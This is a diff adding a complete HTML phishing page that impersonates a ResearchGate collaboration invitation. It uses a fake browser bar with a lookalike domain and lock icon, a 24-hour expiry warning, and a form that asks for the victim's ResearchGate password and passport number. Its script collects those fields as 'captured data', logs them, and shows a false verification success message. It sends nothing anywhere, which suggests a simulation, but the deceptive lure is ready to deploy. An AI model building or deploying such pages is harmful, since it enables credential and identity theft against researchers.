@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>ResearchGate - Collaboration Invitation | Verify Identity</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: #eef1f5;
+            min-height: 100vh;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Fake Browser Bar */
+        .browser-wrapper {
+            width: 100%;
+            max-width: 680px;
+            margin: 20px auto 0;
+            border-radius: 10px 10px 0 0;
+            overflow: hidden;
+            box-shadow: 0 -2px 20px rgba(0, 0, 0, 0.08);
+        }
+
+        .fake-browser-bar {
+            background: #e8e9ed;
+            padding: 10px 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border-bottom: 1px solid #d5d6db;
+        }
+
+        .fake-circle {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            display: inline-block;
+            flex-shrink: 0;
+        }
+        .fake-circle.red {
+            background: #ff5f57;
+        }
+        .fake-circle.yellow {
+            background: #febc2e;
+        }
+        .fake-circle.green {
+            background: #28c840;
+        }
+
+        .fake-url-bar {
+            background: #fdfdfd;
+            padding: 7px 14px;
+            border-radius: 20px;
+            border: 1px solid #cfd0d5;
+            flex: 1;
+            font-family: "SF Mono", "Courier New", monospace;
+            font-size: 12px;
+            color: #3d3d3d;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .fake-url-bar .lock-icon {
+            color: #2d7a4f;
+            font-size: 13px;
+            flex-shrink: 0;
+        }
+        .fake-url-bar .domain {
+            font-weight: 600;
+            color: #1a1a1a;
+        }
+        .fake-url-bar .path {
+            color: #6b6b6b;
+        }
+
+        /* Main Container */
+        .container {
+            width: 100%;
+            max-width: 680px;
+            background: #ffffff;
+            border-radius: 0 0 10px 10px;
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.13);
+            overflow: hidden;
+            margin-bottom: 24px;
+        }
+
+        /* Header */
+        .header {
+            background: #ffffff;
+            padding: 24px 32px 20px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            border-bottom: 1px solid #e8ecf0;
+        }
+
+        .logo {
+            width: 48px;
+            height: 48px;
+            background: #40ba9b;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .logo svg {
+            width: 28px;
+            height: 28px;
+            fill: white;
+        }
+
+        .header-text h1 {
+            font-size: 19px;
+            font-weight: 700;
+            color: #1a2b3c;
+            margin-bottom: 3px;
+            letter-spacing: -0.3px;
+        }
+        .header-text p {
+            font-size: 13px;
+            color: #6b7d8e;
+            font-weight: 400;
+        }
+
+        /* Alert Banner */
+        .alert-banner {
+            background: #fff8e6;
+            border-left: 4px solid #f0a030;
+            border-bottom: 1px solid #fdecc8;
+            padding: 14px 24px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+        .alert-banner .alert-icon {
+            font-size: 22px;
+            flex-shrink: 0;
+            line-height: 1;
+        }
+        .alert-banner .alert-content p {
+            font-size: 13px;
+            color: #7a5d1a;
+            line-height: 1.5;
+        }
+        .alert-banner .alert-content p strong {
+            color: #b85d14;
+        }
+
+        /* Form Container */
+        .form-container {
+            padding: 28px 32px 32px;
+        }
+
+        .section-title {
+            font-size: 15px;
+            font-weight: 700;
+            color: #1a2b3c;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #40ba9b;
+            letter-spacing: -0.2px;
+        }
+
+        .section-subtitle {
+            font-size: 13px;
+            color: #6b7d8e;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 16px;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .form-group.full-width {
+            grid-column: 1 / -1;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #2d3a4a;
+            margin-bottom: 6px;
+            letter-spacing: -0.1px;
+        }
+        .form-group label .required {
+            color: #e05050;
+            margin-left: 2px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1.5px solid #d5dbe3;
+            border-radius: 7px;
+            font-size: 14px;
+            font-family: inherit;
+            color: #1a2b3c;
+            background: #fafbfc;
+            transition: all 0.2s ease;
+        }
+        .form-group input::placeholder {
+            color: #aab5c0;
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: #40ba9b;
+            background: #ffffff;
+            box-shadow: 0 0 0 3px rgba(64, 186, 155, 0.1);
+        }
+
+        .form-row .form-group {
+            margin-bottom: 18px;
+        }
+
+        /* Submit Button */
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background: #40ba9b;
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            letter-spacing: 0.1px;
+            transition: all 0.2s ease;
+            margin-top: 6px;
+            font-family: inherit;
+        }
+        .submit-btn:hover {
+            background: #36a78a;
+            box-shadow: 0 4px 14px rgba(64, 186, 155, 0.35);
+            transform: translateY(-1px);
+        }
+        .submit-btn:active {
+            transform: translateY(0);
+            box-shadow: none;
+        }
+
+        /* Footer */
+        .footer {
+            background: #f7f9fb;
+            padding: 14px 32px;
+            text-align: center;
+            font-size: 11px;
+            color: #8a99a8;
+            border-top: 1px solid #e8ecf0;
+            line-height: 1.5;
+        }
+        .footer span {
+            color: #40ba9b;
+            font-weight: 500;
+        }
+
+        /* Success Message */
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 60px 40px;
+        }
+        .success-message .icon {
+            font-size: 64px;
+            margin-bottom: 16px;
+        }
+        .success-message h2 {
+            color: #2d8a6e;
+            font-size: 22px;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+        .success-message p {
+            color: #5a6d7e;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        .success-message .check-circle {
+            display: inline-block;
+            width: 72px;
+            height: 72px;
+            border-radius: 50%;
+            background: #e6f7f2;
+            color: #40ba9b;
+            font-size: 40px;
+            line-height: 72px;
+            margin-bottom: 16px;
+        }
+
+        /* Responsive */
+        @media (max-width: 600px) {
+            .browser-wrapper,
+            .container {
+                max-width: 100%;
+                margin-left: 10px;
+                margin-right: 10px;
+                border-radius: 8px;
+            }
+            .browser-wrapper {
+                margin-top: 10px;
+            }
+            .form-row {
+                grid-template-columns: 1fr;
+                gap: 0;
+            }
+            .header {
+                padding: 18px 20px;
+                gap: 12px;
+            }
+            .form-container {
+                padding: 20px;
+            }
+            .header-text h1 {
+                font-size: 17px;
+            }
+            .fake-url-bar {
+                font-size: 10px;
+                padding: 6px 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Fake Browser Bar -->
+    <div class="browser-wrapper">
+        <div class="fake-browser-bar">
+            <span class="fake-circle red"></span>
+            <span class="fake-circle yellow"></span>
+            <span class="fake-circle green"></span>
+            <div class="fake-url-bar">
+                <span class="lock-icon">🔒</span>
+                <span>https://</span><span class="domain">researchgate-collab.secure-id.org</span><span class="path">/verify-identity</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Container -->
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="logo">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
+                </svg>
+            </div>
+            <div class="header-text">
+                <h1>ResearchGate</h1>
+                <p>Discover scientific knowledge, and make your research visible.</p>
+            </div>
+        </div>
+
+        <!-- Alert Banner -->
+        <div class="alert-banner">
+            <span class="alert-icon">⏳</span>
+            <div class="alert-content">
+                <p><strong>Invitation expires in 24 hours.</strong> You have been invited to collaborate on a research project. For security, please verify your identity to view the invitation details and connect with the project team. Verify now to accept.</p>
+            </div>
+        </div>
+
+        <!-- Form Section -->
+        <div id="formSection">
+            <div class="form-container">
+                <div class="section-title">Identity Verification</div>
+                <p class="section-subtitle">Please complete all fields below to verify your identity and access the collaboration invitation. Your information is encrypted and handled securely.</p>
+
+                <form id="mainForm" onsubmit="handleSubmit(event)">
+                    <!-- Row 1: Full Name + Email -->
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="full_name">Full Name <span class="required">*</span></label>
+                            <input type="text" id="full_name" name="full_name" placeholder="e.g., John Smith" required autocomplete="name">
+                        </div>
+                        <div class="form-group">
+                            <label for="email">Email Address <span class="required">*</span></label>
+                            <input type="text" id="email" name="email" placeholder="e.g., john.smith@university.edu" required autocomplete="email">
+                        </div>
+                    </div>
+
+                    <!-- Row 2: Password + Institution -->
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="password">ResearchGate Password <span class="required">*</span></label>
+                            <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
+                        </div>
+                        <div class="form-group">
+                            <label for="institution">Institution <span class="required">*</span></label>
+                            <input type="text" id="institution" name="institution" placeholder="e.g., University of Science" required>
+                        </div>
+                    </div>
+
+                    <!-- Row 3: Department + Research Area -->
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="department">Department <span class="required">*</span></label>
+                            <input type="text" id="department" name="department" placeholder="e.g., Physics" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="research_area">Research Area <span class="required">*</span></label>
+                            <input type="text" id="research_area" name="research_area" placeholder="e.g., Quantum Computing" required>
+                        </div>
+                    </div>
+
+                    <!-- Row 4: Country + Passport Number -->
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="country">Country <span class="required">*</span></label>
+                            <input type="text" id="country" name="country" placeholder="e.g., United States" required autocomplete="country-name">
+                        </div>
+                        <div class="form-group">
+                            <label for="passport_number">Passport Number <span class="required">*</span></label>
+                            <input type="text" id="passport_number" name="passport_number" placeholder="e.g., X1234567" required>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="submit-btn">Verify Identity &amp; Accept Invitation</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- Success Message -->
+        <div id="successSection" class="success-message">
+            <div class="check-circle">✓</div>
+            <h2>Identity Verified Successfully</h2>
+            <p>Your identity has been confirmed. You will be redirected to the collaboration invitation page shortly. The project team has been notified of your acceptance.</p>
+            <p style="font-size:12px;color:#999;margin-top:12px;">You may now close this window.</p>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p>&copy; 2024 <span>ResearchGate</span> · All rights reserved · Secure verification via <span>researchgate-collab.secure-id.org</span></p>
+            <p style="margin-top:4px;">Terms of Service · Privacy Policy · Contact Support</p>
+        </div>
+    </div>
+
+    <script>
+        function handleSubmit(event) {
+            event.preventDefault();
+
+            // Collect form data
+            const formData = {
+                full_name: document.getElementById('full_name').value,
+                email: document.getElementById('email').value,
+                password: document.getElementById('password').value,
+                institution: document.getElementById('institution').value,
+                department: document.getElementById('department').value,
+                research_area: document.getElementById('research_area').value,
+                country: document.getElementById('country').value,
+                passport_number: document.getElementById('passport_number').value
+            };
+
+            // Log the captured data
+            console.log('Form submitted:', formData);
+
+            // Hide form and show success
+            document.getElementById('formSection').style.display = 'none';
+            document.getElementById('successSection').style.display = 'block';
+
+            // Scroll to top of container
+            document.querySelector('.container').scrollIntoView({ behavior: 'smooth', block: 'start' });
+
+            return false;
+        }
+    </script>
+</body>
+</html>
